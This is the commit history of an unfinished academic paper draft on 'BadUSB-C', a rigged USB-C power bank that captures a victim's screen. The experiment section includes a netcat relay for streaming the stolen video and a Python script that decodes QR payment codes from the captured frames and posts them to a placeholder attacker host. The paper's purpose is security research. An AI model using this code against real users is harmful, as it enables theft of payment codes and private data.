### 2020-12-15 WOOT/BadUSBC.tex
Add Woot

\documentclass[conference]{IEEEtran}
\IEEEoverridecommandlockouts
% The preceding line is only needed to identify funding in the first footnote. If that is unneeded, please comment it out.
\usepackage{cite}
\usepackage{amsmath,amssymb,amsfonts}
\usepackage{algorithmic}
\usepackage{graphicx}
\usepackage{textcomp}
\usepackage{xcolor}
\def\BibTeX{{\rm B\kern-.05em{\sc i\kern-.025em b}\kern-.08em
    T\kern-.1667em\lower.7ex\hbox{E}\kern-.125emX}}
\begin{document}

\title{Is It Possible to Steal Money Through USB-C?
}

\author{\IEEEauthorblockN{1\textsuperscript{st} Given Name Surname}
\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
\textit{name of organization (of Aff.)}\\
City, Country \\
email address or ORCID}
\and
\IEEEauthorblockN{2\textsuperscript{nd} Given Name Surname}
\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
\textit{name of organization (of Aff.)}\\
City, Country \\
email address or ORCID}
\and
\IEEEauthorblockN{3\textsuperscript{rd} Given Name Surname}
\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
\textit{name of organization (of Aff.)}\\
City, Country \\
email address or ORCID}
\and
\IEEEauthorblockN{4\textsuperscript{th} Given Name Surname}
\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
\textit{name of organization (of Aff.)}\\
City, Country \\
email address or ORCID}
\and
\IEEEauthorblockN{5\textsuperscript{th} Given Name Surname}
\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
\textit{name of organization (of Aff.)}\\
City, Country \\
email address or ORCID}
\and
\IEEEauthorblockN{6\textsuperscript{th} Given Name Surname}
\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
\textit{name of organization (of Aff.)}\\
City, Country \\
email address or ORCID}
}

\maketitle
\thispagestyle{plain}

\begin{abstract}
Abstract~\cite{CGF1}.
\end{abstract}

\begin{IEEEkeywords}
BadUSB
\end{IEEEkeywords}

\input{./Files/introduction.tex}
\input{./Files/background.tex}
\input{./Files/related_work.tex}
\input{./Files/badusb.tex}
\input{./Files/experiment.tex}
\input{./Files/discussion.tex}
\input{./Files/conclusion.tex}
%\input{./Files/acknowledgement.tex}

\bibliographystyle{IEEEtran}
\bibliography{BadUSBC}

\end{document}

### 2020-12-15 WOOT/Files/badusb.tex
Add Woot

\section{BadUSB-C}

\subsection{Motivation}

\subsection{Implementation}

### 2020-12-20 WOOT/Files/badusb.tex
Add implementation part and LaTeX writing convention

@@
 \subsection{Implementation}
+The implementation of BadUSB-C extends several existing offensive BadUSB device including Rubber Ducky (where we implement the co-operation of HID emulation and screen streaming) and Raspberry Pi (on which we implement the capture of video stream and its processing).
+We implemented the QR-Code extraction agent from scratch.
+The complete workflow of BadUSB-C, demonstrating the interaction of all the components is presented at Fig.~\ref{workflow}.
+
+\begin{figure}[htbp]
+\includegraphics[width=\linewidth]{./Figs/workflow.png}
+\caption{Workflow of BadUSB-C}
+\label{workflow}
+\end{figure}
+
+When the victim plugs in BadUSB-C device, the USB-C hub handles all the communication between each components and the victim's device.
+Due to the trust-by-default feature of USB protocol, the victim's video stream will be captured.
+Later, the stream is either processed directly by Raspberry Pi or transmitted to the attacker through GSM/WiFi components.
+
+With video stream the capability of original Rubbery Ducky attack is considerably expanded.
+For example, the attacker can directly control the victim's device and view the private data in the stream.
+More details is presented in the Section~\ref{section:experiment}

### 2020-12-20 WOOT/Files/related_work.tex
Add motivation and several common packages

\section{Related Work}
\label{section:related_work}

### 2020-12-20 WOOT/Files/experiment.tex
very draft for experiment

\section{Experiment}
\label{section:experiment}

Overview, the experiment equipment consists of
a USB Type-C hub with HDMI and USB port,
a raspberry pi 4B with a Wi-Fi chip onboard,
a video capture card adapting HDMI signal to USB camera,
and a normal powerbank with dual outputs.

The normal powerbank is used to supply a piece of raspberry pi 4B and
charge victim's device.
The USB-C hub adapts USB Type-C to HDMI port and USB port.
 The whole equipment exposed only one type-c cable (from USB-C hub),
and the equipment will charge his or her device through this cable,
which has no difference from ordinary powerbanks.

\subsection{Real-time monitoring}

When connected to network,
the raspberry pi can use ``ffmpeg'' to encode video stream from victim device,
and then use ``netcat'' to send encoded video stream to a intermediate transit server.
By this means, the attacker is able to monitor the victim devices in real-time.

\begin{lstlisting}[caption={Precondition Checking for the Selfdestruct Call},label=lst1:mxm]
    nc -nlkvp 1234 | nc -nlkvp 4321

\end{lstlisting}

\subsection{Private information extraction}

Real-time monitoring is ideal for the attacker to grab all information shown on victim devices,
 but it requires high power consumption to encode video streams and stable network connections.
In some situations, high power consumption will increase the posibilities of alerting the victim,
and it is hard to guarantee stable network connections.

Considering that, extracting only high-value information for attacker (or highly sensitive information for victim) is more efficient.
The raspberry pi can use ``opencv'' to identify information from video stream.
For example, extracting the victim's name, photo, address, and ID number when victim is viewing his or her photos including a photo of his or her ID card,
extracting the victim's payment information or payment code when victim is showing his or her payment information.
Here is an example of extracting payment code with opencv library in listing~\ref{lst2:qr},

\begin{lstlisting}[caption={python script for extracting payment code of victim},label=lst2:qr]
    import cv2
    import pyzbar.pyzbar as pyzbar
    import qrcode
    import requests
    def decodeDisplay(video):
        global current
        gray = cv2.cvtColor(video, cv2.COLOR_BGR2GRAY)
        barcodes = pyzbar.decode(gray)
        for barcode in barcodes:
            barcodeData = barcode.data.decode("utf-8")
            barcodeType = barcode.type
            img = qrcode.make(barcodeData)
            requests.post(
                'http://attacker',
                data={'code': barcodeData}
            )
    if __name__ == '__main__':
        # 0 is the camera ID
        cam = cv2.VideoCapture(0)
        while True:
            ret, frame = cam.read()
            decodeDisplay(frame)
            if cv2.waitKey(5) == 27:
                break
        cam.release()
        cv2.destroyAllWindows()
\end{lstlisting}

### 2020-12-20 WOOT/Files/badusb.tex

@@
 \subsection{Motivation}
+As we introduced in the Section~\ref{section:related_work}, there are plenty of existing work \shuqing{Add citation} focusing on BadUSB attack. 
+Many of these take use of the \textit{default trust} given by computers to HIDs, pretend normal USB devices as HIDs and uitilize USB protocol to perform attacks. 
+However, these attacks suffer from various drawbacks:
+\ding{182} attackers can only simulate limited types of HIDs like keyboards, mice, and disks, which makes the attacks less effective;
+\ding{183} accurate attacks couldn't be performed due to lacking of user interface (UI).
+Whatever HID the attackers simulate their USB devices to be, they couldn't obtain the UI to check the current situation, which makes it nearly impossible to locate their attacks precisely or confirm the effects after attacks.
+
+In this work, we utilized the new features of USB-C to address the problems above.
+Benefiting from USB-C, we simulated vedio card and thus obtained the video stream of UI to perform accurate attacks.
 

### 2020-12-20 WOOT/Files/related_work.tex

@@
 \label{section:related_work}
+In this part, we survey related works on USB attack security in Section III-A, and USB defence security in Section III-B, respectively.
+\subsection{USB Attack Security}
+USB 1.0\cite{usb01} was first introduced in 1996, which was designed to provide interfaces for disparate peripherals and reduce the complexity of both hardware design and software configuration\cite{sok}.
+USB 1.0 provided the data transfer for Low Speed(1.5 Mbit/s) and Full Speed( 12Mbit/s).
+Before USB 2.0 was released in 2000 and widely used, USB attacks are limited to human layer error attacks, \cite{se}, \cite{goverment}, \cite{atkvec}, \cite{ueerreallydo}, e.g, throwing a bad USB device on purpose, are in order to damage host through plugging in a peripheral by trust default.
+
+USB 2.0 protocol increased the speed of data transfer and it was also expended to include digit cameras.
+According to the protocol, the host recognises the peripherals through enumeration, and this gives attacked chance to cheat the host.
+BadUSB\cite{badusb} is going to attack host by modifying the devices' identify, re-flash the firmware to add more functionalities to the USB devices, for example, it can present malicious interfaces as a sample HID interfaces or work as a network adapter on a USB thumb driver.
+Other USB attacks, \cite{rubber}, \cite{usbdriver}, \cite{usbbypassing}, \cite{iseeyou} are also masquerading the USB protocol and provided illegal functionality interface to the host, taking advantage of the permissive trust model in USB whereby the host fully trust the devices connected.
+\cite{syzkaller} use the fact that the host's USB software stack generally expects devices with a standard USB protocol, with the help of fuzzing techniques using FaceDancer \cite{facedancer} and debuggers, it takes a number of vulnerabilities to the kernel-model.
+Furthermore, expect from the protocol related attack, the radio frequency based sensitive data stealing is another kind of attack, \cite{smartphone} , \cite{poweremi}, \cite{badusbhub}, \cite{usbfinger}, \cite{side}, \cite{usbdriver} work based on signal eavesdropping to attack during the data extraction, and \cite{usbkiller}, \cite{cable}, \cite{usbee}, \cite{turnip} use the RF transmitter to inject signal to cause physical damage to the host machine.
+
+As our best knowledge, attacks based on USB 3.0\cite{usb03} have not been discovered.
+In this work, we focus on attack based on USB 3.0 in the layer of transport\cite{sok}, which use the USB protocol to control the host or inject malicious command to the host connected with Type-C\cite{typec}, and streal the data trough it.
+
+\subsection{USB Defence Security}

### 2020-12-20 WOOT/Files/related_work.tex
add related_work defense

@@
 \subsection{USB Defence Security}
+
+Tian, Jing, et al.[1] have made a brief overview of the defense countermeasures over four layers attack in the article.
+For attacks against human-layer problems, [2],[3]raise people's awareness of social engineering,[][][4],[5],[6] prevent the data from being stolen by on-device encryption, [7],[8] provide host authentication, [8]monitor data flow to record potential malicious IO behaviors and [9],[10]block physical connections to defense.
+In application layer,modification over OS and driver are adapted.
+[11],[12],[13] harden  host system to prevent automatic execution of malicious code.
+GOOD USB[14] offers strict access control, with the system soliciting desired functionality from the user and blocking other functionality for a device.
+Ghost[15] simulates as a USB device to detect if the host has malicious code injection.
+In transport layer,
+
+FirmUSB[16] and VIPER[17] check the firmware of the device to ensure its safety.
+Fuzzing is a method of detecting vulnerabilities by providing unexpected input to the target system and monitoring for abnormal results.
+Some related work,[][][18],[19],[20] ,focuses on using USB fuzzing approach to detect potential bugs in USB driver.
+USBFirewall[21] protects the host based on error detection of USB communication packages.
+In some related work, [14],[22], e.
+g, VM is deployed in host to interact with the USB device for malicious behavior detection.
+In physical layer, some related work like [23] consider anti-fingerprinting ,and some others like [24] consider data encryption on USB bus.

### 2020-12-20 WOOT/Files/badusb.tex
add new convention about label, combine member's .tex,

@@
-\section{BadUSB-C}
+\section{\tool}
 
 \subsection{Motivation}
-As we introduced in the Section~\ref{section:related_work}, there are plenty of existing work \shuqing{Add citation} focusing on BadUSB attack. 
+As we introduced in the Section~\ref{sec:related_work}, there are plenty of existing work \shuqing{Add citation} focusing on BadUSB attack. 
 Many of these take use of the \textit{default trust} given by computers to HIDs, pretend normal USB devices as HIDs and uitilize USB protocol to perform attacks. 
@@
 \subsection{Implementation}
-The implementation of BadUSB-C extends several existing offensive BadUSB device including Rubber Ducky (where we implement the co-operation of HID emulation and screen streaming) and Raspberry Pi (on which we implement the capture of video stream and its processing).
+The implementation of \tool extends several existing offensive BadUSB device including Rubber Ducky\hongyi{Add Citation} (where we implement the co-operation of HID emulation and screen streaming) and Raspberry Pi (on which we implement the capture of video stream and its processing).
 We implemented the QR-Code extraction agent from scratch.
-The complete workflow of BadUSB-C, demonstrating the interaction of all the components is presented at Fig.~\ref{workflow}.
+The complete workflow of \tool, demonstrating the interaction of all the components is presented at Fig.~\ref{fig:workflow}.
 
@@
 \includegraphics[width=\linewidth]{./Figs/workflow.png}
-\caption{Workflow of BadUSB-C}
-\label{workflow}
+\caption{Workflow of \tool}
+\label{fig:workflow}
 \end{figure}
 
-When the victim plugs in BadUSB-C device, the USB-C hub handles all the communication between each components and the victim's device.
+When the victim plugs in \tool device, the USB-C hub handles all the communication between each components and the victim's device.
 Due to the trust-by-default feature of USB protocol, the victim's video stream will be captured.
@@
 For example, the attacker can directly control the victim's device and view the private data in the stream.
-More details is presented in the Section~\ref{section:experiment}
+More details is presented in the Section~\ref{sec:experiment}

### 2020-12-20 WOOT/Files/related_work.tex
add new convention about label, combine member's .tex,

--- 2020-12-20 WOOT/Files/related_work.tex
@@
 \section{Related Work}
-\label{section:related_work}
+\label{sec:related_work}
 In this part, we survey related works on USB attack security in Section III-A, and USB defence security in Section III-B, respectively.

### 2020-12-21 WOOT/Files/badusb.tex
Add Latex utility

@@
 \subsection{Implementation}
-The implementation of \tool extends several existing offensive BadUSB device including Rubber Ducky\hongyi{Add Citation} (where we implement the co-operation of HID emulation and screen streaming) and Raspberry Pi (on which we implement the capture of video stream and its processing).
+The implementation of \tool\ extends several existing offensive BadUSB device including Rubber Ducky\hongyi{Add Citation} (where we implement the co-operation of HID emulation and screen streaming) and Raspberry Pi (on which we implement the capture of video stream and its processing).
 We implemented the QR-Code extraction agent from scratch.

### 2020-12-22 WOOT/Files/background.tex
add outline

\section{Background}
\label{sec:background}
\noindent\outline{USB Standard}\\
\outline{Terminology}\\
\outline{USB1.0}\\
\outline{USB2.0}\\
\outline{USB3.0}\\
\outline{USB-C}\\
\outline{Arduino USB Stack/Linux 2.0 Gadget Driver}\\

### 2020-12-22 WOOT/Files/badusb.tex
add outline

--- 2020-12-20 WOOT/Files/badusb.tex
@@
 \section{\tool}
-
+\label{sec:badusb}
 \subsection{Motivation}
+\noindent\outline{Limitation of Rubber Ducky}\\
+\outline{Our functionality different mode listing?}\\
+\hongyi{The following mode is to be further decided}
+\outline{Automatic Scripting Mode}\\
+\outline{Remote Control Mode}\\
+\outline{OCR/QR Recognition Mode}\\
 As we introduced in the Section~\ref{sec:related_work}, there are plenty of existing work \shuqing{Add citation} focusing on BadUSB attack. 
@@
 \subsection{Implementation}
-The implementation of \tool extends several existing offensive BadUSB device including Rubber Ducky\hongyi{Add Citation} (where we implement the co-operation of HID emulation and screen streaming) and Raspberry Pi (on which we implement the capture of video stream and its processing).
+\noindent\hongyi{The following mode is to be further decided}\\
+\outline{DETAIL of each mode}\\
+\outline{Automatic Scripting Mode}\\
+\outline{Remote Control Mode}\\
+\outline{OCR/QR Recognition Mode}\\
+The implementation of \tool\ extends several existing offensive BadUSB device including Rubber Ducky\hongyi{Add Citation} (where we implement the co-operation of HID emulation and screen streaming) and Raspberry Pi (on which we implement the capture of video stream and its processing).
 We implemented the QR-Code extraction agent from scratch.

### 2020-12-22 WOOT/Files/conclusion.tex
add outline

\section{Conclusion}
\label{sec:conclusion}
\outline{Conclusion}

### 2020-12-22 WOOT/Files/discussion.tex
add outline

\section{Discussion}
\label{sec:discussion}
\outline{Defenses}

### 2020-12-22 WOOT/Files/experiment.tex
add new convention about label, combine member's .tex,
add outline

@@
 \section{Experiment}
-\label{section:experiment}
-
+\label{sec:experiment}
+\noindent\outline{Case Study: Sharing Power Bank}\\
+\outline{Overview}\\
+\outline{Attack Procedure(how to  get picture, etc.)}\\
+\outline{Security Issues against APPLE/Android...etc.}\\
 Overview, the experiment equipment consists of

### 2020-12-22 WOOT/Files/introduction.tex
add outline

\section{Introduction}
\label{sec:introduction}
\noindent\outline{Detail intro of USB protocol}\\
\outline{Rubber Ducky and its function}\\
\outline{Bank Robber and its function}\\
\outline{Case Study of QR Scanning}\\

### 2020-12-22 WOOT/Files/related_work.tex
add outline

@@
 \label{sec:related_work}
+\hongyi{Move the stuff about USB protocol to Background}\\
 In this part, we survey related works on USB attack security in Section III-A, and USB defence security in Section III-B, respectively.
@@
 \subsection{USB Defence Security}
+
+Tian, Jing, et al.\cite{sok} have made a brief overview of the defense countermeasures over four layers attack in the article.
+For attacks against human-layer problems, \cite{cmu}raise people's awareness of social engineering,\cite{Ironkey},\cite{Kanguru},\cite{diwan2014complete} prevent the data from being stolen by on-device encryption, \cite{butler2010kells},\cite{tian2016provusb} provide host authentication and monitor data flow to record potential malicious IO behaviors.
+[9] block physical connections to defense.
+In application layer,modification over OS and driver are adapted.
+\cite{pham2010optimizing} and \cite{OPSWAT} harden  host system to prevent automatic execution of malicious code.
+GoodUSB \cite{tian2015defending} offers strict access control, with the system soliciting desired functionality from the user and blocking other functionality for a device.
+Ghost \cite{poeplau2012honeypot} simulates as a USB device to detect if the host has malicious code injection.
+In transport layer, FirmUSB \cite{hernandez2017firmusb} and VIPER \cite{li2011viper} check the firmware of the device to ensure its safety.
+Fuzzing is a method of detecting vulnerabilities by providing unexpected input to the target system and monitoring for abnormal results.
+Some related work,\cite{jodeit2010usb},\cite{schumilo2014don},\cite{patrick2017potus},focuses on using USB fuzzing approach to detect potential bugs in USB driver.
+USBFirewall \cite{johnson2017protecting} protects the host based on error detection of USB communication packages.
+In some related work, \cite{tian2015defending},\cite{angel2016defending}, e.
+g, VM is deployed in host to interact with the USB device for malicious behavior detection.
+In physical layer, some related work like \cite{bates2014leveraging} consider anti-fingerprinting ,and some others like \cite{neugschwandtner2016transparent} consider data encryption on USB bus.

### 2020-12-23 WOOT/Files/related_work.tex
related work outline

--- 2020-12-20 WOOT/Files/related_work.tex
@@
 \section{Related Work}
-\label{section:related_work}
+\label{sec:related_work}
+\hongyi{Move the stuff about USB protocol to Background}\\
+\outline{attack based on USB 1.0, briefly}\\
+\outline{attack based on USB 2.0, focus on works about application and transport layer}\\
+\outline{attack survey table}\\
+\outline{attack about USB Type-C}\\
+
 In this part, we survey related works on USB attack security in Section III-A, and USB defence security in Section III-B, respectively.

### 2020-12-23 WOOT/Files/related_work.tex
related work outline
note possible copy

--- 2020-12-22 WOOT/Files/related_work.tex
@@
 \subsection{USB Attack Security}
-USB 1.0\cite{usb01} was first introduced in 1996, which was designed to provide interfaces for disparate peripherals and reduce the complexity of both hardware design and software configuration\cite{sok}.
-USB 1.0 provided the data transfer for Low Speed(1.5 Mbit/s) and Full Speed( 12Mbit/s).
+\hongyi{DO NOT COPY!}\textcolor{red}{USB 1.0\cite{usb01} was first introduced in 1996, which was designed to provide interfaces for disparate peripherals and reduce the complexity of both hardware design and software configuration\cite{sok}.} USB 1.0 provided the data transfer for Low Speed(1.5 Mbit/s) and Full Speed( 12Mbit/s).
 Before USB 2.0 was released in 2000 and widely used, USB attacks are limited to human layer error attacks, \cite{se}, \cite{goverment}, \cite{atkvec}, \cite{ueerreallydo}, e.g, throwing a bad USB device on purpose, are in order to damage host through plugging in a peripheral by trust default.

### 2020-12-23 WOOT/Files/related_work.tex

--- 2020-12-23 WOOT/Files/related_work.tex
@@
 \hongyi{Move the stuff about USB protocol to Background}\\
-\outline{attack based on USB 1.0, briefly}\\
-\outline{attack based on USB 2.0, focus on works about application and transport layer}\\
-\outline{attack survey table}\\
-\outline{attack about USB Type-C}\\
+\outline{Attack based on USB 1.0, briefly}\\
+\outline{Attack based on USB 2.0, focus on works about application and transport layer}\\
+\outline{Attack survey table}\\
+\outline{Attack or current works about USB Type-C}\\
 

### 2020-12-23 WOOT/Files/background.tex
note possible copy
changing USB citation from 0x to x0 i.e. USB 2.0's citation is usb20 instead of usb02, and added some background

@@
 \noindent\outline{USB Standard}\\
-\outline{Terminology}\\
-\outline{USB1.0}\\
-\outline{USB2.0}\\
+We first introduce the development of USB specification and emphasize the key points adopted in our work.
+
+\noindent\outline{USB1.x}\\
+Proposed in 1996, USB 1.0\cite{usb10} was developed to provide an unified interface and thus reducing the cost of re-configuring the software.
+
+USB1.x\cite{usb10}\cite{usb11} provided two data transfer rates which are Low Speed (1.5 Mbit/s) and Full Speed (12 MBit/s).
+At this point, due to the transfer limit, it only supports limited kinds of devices like keyboard, mice, etc.
+
+\noindent\outline{USB2.0}\\
+In 2000, USB2.0\cite{usb20} was released.
 \outline{USB3.0}\\

### 2020-12-23 WOOT/Files/related_work.tex
changing USB citation from 0x to x0 i.e. USB 2.0's citation is usb20 instead of usb02, and added some background

@@
 \subsection{USB Attack Security}
-\hongyi{DO NOT COPY!}\textcolor{red}{USB 1.0\cite{usb01} was first introduced in 1996, which was designed to provide interfaces for disparate peripherals and reduce the complexity of both hardware design and software configuration\cite{sok}.} USB 1.0 provided the data transfer for Low Speed(1.5 Mbit/s) and Full Speed( 12Mbit/s).
+\hongyi{DO NOT COPY!}\textcolor{red}{USB 1.0\cite{usb10} was first introduced in 1996, which was designed to provide interfaces for disparate peripherals and reduce the complexity of both hardware design and software configuration\cite{sok}.} USB 1.0 provided the data transfer for Low Speed(1.5 Mbit/s) and Full Speed( 12Mbit/s).
 Before USB 2.0 was released in 2000 and widely used, USB attacks are limited to human layer error attacks, \cite{se}, \cite{goverment}, \cite{atkvec}, \cite{ueerreallydo}, e.g, throwing a bad USB device on purpose, are in order to damage host through plugging in a peripheral by trust default.
@@
 
-As our best knowledge, attacks based on USB 3.0\cite{usb03} have not been discovered.
+As our best knowledge, attacks based on USB 3.0\cite{usb30} have not been discovered.
 In this work, we focus on attack based on USB 3.0 in the layer of transport\cite{sok}, which use the USB protocol to control the host or inject malicious command to the host connected with Type-C\cite{typec}, and streal the data trough it.

### 2020-12-23 WOOT/Files/background.tex
wrapping up Backgroud part, start Impl revision

@@
 Proposed in 1996, USB 1.0\cite{usb10} was developed to provide an unified interface and thus reducing the cost of re-configuring the software.
+It is worth mentioning that as a polled-bus interface, all data transfers are initiated by the host.
 
@@
 \noindent\outline{USB2.0}\\
-In 2000, USB2.0\cite{usb20} was released.
-\outline{USB3.0}\\
-\outline{USB-C}\\
-\outline{Arduino USB Stack/Linux 2.0 Gadget Driver}\\
+In 2000, USB 2.0\cite{usb20} specification was released.
+With High Speed (480 Mbit/s) mode introduced, printer, camera, CD-ROM drive and network cards were supported in this revision.
+Such high data transfer rate also gave rise to the popularity of ``flash drive'', portable device that allows physically transferring data around \cite{sok}.
+Though various peripherals were supported in USB 2.0, there was no reliable way to ensure a device is actually what it claims to be.
+This security flaw allowed attacks like Rubber Ducky\cite{rubber}.
+
+\noindent\outline{USB3.x}\\
+USB 3.0\cite{usb30} was announced in 2008, with a Super Speed (5 Gbit/s) data transfer rate.
+Like its predecessor, more classes of peripherals were supported in this revision.
+In 2013, USB Type-C connector standard was introduced as a part of USB 3.1\cite{usb31}, providing a unified connector type for PowerDelivery (PD), Thunderbolt, DisplayPort and HDMI.
+Yet no improvement of security was introduced in 3.x revisions, meaning any device claiming themselves as a monitor can capture the video stream from the host.
+Exposing such multi-propose connector unprotected is dangerous and allows attacks like our work \tool.
+In 2017, USB 3.2\cite{usb32} was released, doubling the data transfer rate.
+(20 Gbit/s)
+
+\noindent\outline{Security Problem}\\
+During the development of USB specification, security was rarely considered.
+As the USB-IF believes it is the duty of original equipment manufacturers (OEMs) to decide whether security features should be implemented.\hongyi{Citation needed}.
+But the divergent implementation give chance for attack like Rubber Ducky\cite{rubber} and our \tool.

### 2020-12-24 WOOT/Files/background.tex
revision of Motivation

@@
 Such high data transfer rate also gave rise to the popularity of ``flash drive'', portable device that allows physically transferring data around \cite{sok}.
-Though various peripherals were supported in USB 2.0, there was no reliable way to ensure a device is actually what it claims to be.
+Though various peripherals were supported in USB 2.0, there was no reliable way to identify the type of a device.
 This security flaw allowed attacks like Rubber Ducky\cite{rubber}.
@@
 As the USB-IF believes it is the duty of original equipment manufacturers (OEMs) to decide whether security features should be implemented.\hongyi{Citation needed}.
-But the divergent implementation give chance for attack like Rubber Ducky\cite{rubber} and our \tool.
+But the divergent implementations give chance for attack like Rubber Ducky\cite{rubber} and our \tool.

### 2020-12-24 WOOT/Files/badusb.tex
revision of Motivation

@@
 As we introduced in the Section~\ref{sec:related_work}, there are plenty of existing work \shuqing{Add citation} focusing on BadUSB attack. 
-Many of these take use of the \textit{default trust} given by computers to HIDs, pretend normal USB devices as HIDs and uitilize USB protocol to perform attacks. 
+Many of these take advantage of the \textit{trust-by-default} policy of PC, pretend normal HID devices and utilize USB protocol to perform attacks. 
 However, these attacks suffer from various drawbacks:
-\ding{182} attackers can only simulate limited types of HIDs like keyboards, mice, and disks, which makes the attacks less effective;
-\ding{183} accurate attacks couldn't be performed due to lacking of user interface (UI).
+\ding{182} attackers can only simulate limited types of HIDs like keyboards, mice, and disks\hongyi{disk is not HID}, which makes the attacks less effective;
+\ding{183} accurate attacks couldn't be performed due to lack of user interface (UI).
 Whatever HID the attackers simulate their USB devices to be, they couldn't obtain the UI to check the current situation, which makes it nearly impossible to locate their attacks precisely or confirm the effects after attacks.
 
-In this work, we utilized the new features of USB-C to address the problems above.
-Benefiting from USB-C, we simulated vedio card and thus obtained the video stream of UI to perform accurate attacks.
+In this work, we utilized the new features of USB 3.x \cite{usb31} \cite{usb32} to address the problems above.
+Benefiting from latest protocol, we simulated video card and thus obtained the video stream to perform accurate attacks.
 

### 2020-12-29 WOOT/Files/experiment.tex
experiment case study

@@
 \noindent\outline{Case Study: Sharing Power Bank}\\
+
+\subsection{Case study: Power Bank Sharing}
+
+Power bank sharing is a digital service which allows user to take short term rentals of power banks.
+A common service provider deploys a large number of power bank sites in the city.
+Then, users can rent power banks from any of the power bank sites, charge their device on the trip, return rented power banks to any of the power bank sites, and pay rent online.
+
+\yechang{site or repository? }
+
+As an example, Brick is such a power bank sharing service provider from Swidian.
+
+\yechang{add hyperlink or reference to Brick or Brick App on app store/googleplay.}
+
+\yechang{Add more example to show that it is widely used?}
+It provides convenience for users, but it also brings security risks.
+We notice that the power bank site does not check the integrity of the power bank during the rental process of the power bank, and users are hardly alert when connecting their devices to the power bank.
+In some situations, a malicious user is able to do some tricks to a rented power bank, return it to a power bank site as normal, and its next user will unknowingly connect to a malicious power bank, which endangers the data and privacy security in users' device.
+
 \outline{Overview}\\
+
+\subsection{Overview}
+
 \outline{Attack Procedure(how to  get picture, etc.)}\\

### 2020-12-31 WOOT/Files/badusb.tex
add impl part, todo: three mode

@@
 \outline{OCR/QR Recognition Mode}\\
-The implementation of \tool\ extends several existing offensive BadUSB device including Rubber Ducky\hongyi{Add Citation} (where we implement the co-operation of HID emulation and screen streaming) and Raspberry Pi (on which we implement the capture of video stream and its processing).
-We implemented the QR-Code extraction agent from scratch.
-The complete workflow of \tool, demonstrating the interaction of all the components is presented at Fig.~\ref{fig:workflow}.
+Though Rubber Ducky\cite{rubber} emulates as a HID device enabling various arbitrary execution attacks, fetching feedback from the victim is more limited.
+Based on this restriction several defense mechanisms were proposed  like USBCheckIn\cite{usbcheckin}\hongyi{We need more example}.
+These defense mechanism implemented a CAPTCHA-like\cite{captcha} procedure, which requires user to complete certain challenges when a unknown HID device is plugged in.
+As the Rubber Ducky is only able to emulate HID device, by no means the Rubber Ducky can obtain the content of challenge and bypass it.
+Our \tool, on the other hand, is capable of bypassing this type of defense.
+Taking advantage of USB 3.x\cite{usb31}\cite{usb32}, \tool can fetch the video stream of the victim and complete the challenge automatically or manually.
 
-\begin{figure}[htbp]
-\includegraphics[width=\linewidth]{./Figs/workflow.png}
-\caption{Workflow of \tool}
-\label{fig:workflow}
-\end{figure}
+As there were various Rubber Ducky implementation available, we only focus on its core functionality and our extension.
+Based on this pattern, we summaries our implementation of \tool into the following modes:
 
-When the victim plugs in \tool device, the USB-C hub handles all the communication between each components and the victim's device.
-Due to the trust-by-default feature of USB protocol, the victim's video stream will be captured.
-Later, the stream is either processed directly by Raspberry Pi or transmitted to the attacker through GSM/WiFi components.
+\begin{itemize}
+\item\textit{Scripting mode} functions like the original Rubber Ducky featuring the bypass of defense mechanism like USBCheckIn\cite{usbcheckin}
+\item \textit{Remote control mode} allows attacker to take complete control of victim's device manually to perform delicate operation.
+\item \textit{Privacy extraction mode} captures and identify private data from the victim and send to the attacker.
+\end{itemize}
 
-With video stream the capability of original Rubbery Ducky attack is considerably expanded.
-For example, the attacker can directly control the victim's device and view the private data in the stream.
-More details is presented in the Section~\ref{sec:experiment}
+\subsubsection{Scripting Mode}
+\subsubsection{Remote Control Mode}
+\subsubsection{Privacy Extraction Mode}

### 2020-12-31 WOOT/Files/experiment.tex
add impl part, todo: three mode

--- 2020-12-22 WOOT/Files/experiment.tex
@@
 \noindent\outline{Case Study: Sharing Power Bank}\\
+
+\subsection{Case study: Power Bank Sharing}
+
+Power bank sharing provides users with short term rental of power banks.
+A provider deploys power bank sites in the city.
+Then, users can rent a power bank from any of the power bank site, charge their device on the trip, return the rented power bank to another site, and pay rent online.
+
+\yechang{site or repository? }
+
+As an example, Brick is such a power bank sharing service provider from Sweden.
+
+\yechang{add hyperlink or reference to Brick or Brick App on App Store/Google Play.}
+
+\yechang{Add more example to show that it is widely used?}
+It provides convenience for users, but it also brings security risks.
+We notice that the power bank site does not check the integrity of power banks during the rental process of the power bank, and users are hardly cautious when connecting their devices to the power bank.
+In some situations, a malicious user is able to modify his/her rented power bank, return it to a power bank site as normal, and its next user will unknowingly connect to this malicious power bank, which endangers the privacy of user.
+
 \outline{Overview}\\
+
+\subsection{Overview}
+
 \outline{Attack Procedure(how to  get picture, etc.)}\\

### 2021-01-01 WOOT/Files/badusb.tex
add impl hardware and script part, add folder to store draw.io figs, minor fix in impl

@@
 \outline{OCR/QR Recognition Mode}\\
-Though Rubber Ducky\cite{rubber} emulates as a HID device enabling various arbitrary execution attacks, fetching feedback from the victim is more limited.
+Though Rubber Ducky\cite{rubber} emulates as a HID device enabling various arbitrary execution attacks, fetching feedback from the victim is much more limited.
 Based on this restriction several defense mechanisms were proposed  like USBCheckIn\cite{usbcheckin}\hongyi{We need more example}.
 These defense mechanism implemented a CAPTCHA-like\cite{captcha} procedure, which requires user to complete certain challenges when a unknown HID device is plugged in.
-As the Rubber Ducky is only able to emulate HID device, by no means the Rubber Ducky can obtain the content of challenge and bypass it.
+As the Rubber Ducky is only able to emulate HID device, by no means the Rubber Ducky can bypass it.
 Our \tool, on the other hand, is capable of bypassing this type of defense.
 Taking advantage of USB 3.x\cite{usb31}\cite{usb32}, \tool can fetch the video stream of the victim and complete the challenge automatically or manually.
+Moreover, with video capability, our \tool achieved multiple new threat model and are tested under various scenarios.
 
 As there were various Rubber Ducky implementation available, we only focus on its core functionality and our extension.
-Based on this pattern, we summaries our implementation of \tool into the following modes:
+Based on this pattern, we summaries our implementation of \tool into the following parts:
 
 \begin{itemize}
+	\item\textit{Hardware specification} the  hardware we uses to build \tool
 	\item\textit{Scripting mode} functions like the original Rubber Ducky featuring the bypass of defense mechanism like USBCheckIn\cite{usbcheckin}
@@
 \end{itemize}
+\subsubsection{Hardware Specification}
+The hardware we use is as follows and the relation between them is illustrated at Fig.~\ref{fig:hardware_specification}
+\begin{itemize}
